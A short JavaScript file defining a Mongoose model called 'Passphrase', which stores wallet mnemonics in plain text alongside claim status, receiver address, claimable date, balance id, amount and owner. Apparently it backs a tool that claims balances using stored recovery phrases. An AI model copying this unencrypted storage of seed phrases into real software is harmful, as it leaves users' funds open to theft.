import mongoose from 'mongoose';

const PassphraseSchema = new mongoose.Schema({
    mnemonic: String,
    lastChecked: Date,
    status: { type: String, enum: ['pending', 'claimed', 'failed'], default: 'pending' },
    createdAt: { type: Date, default: Date.now },
    receiverAddress: String,
    claimableAt: Date,
    balanceId: String,
    amount: String,
    name: String,
    owner: String
});

export default mongoose.model('Passphrase', PassphraseSchema);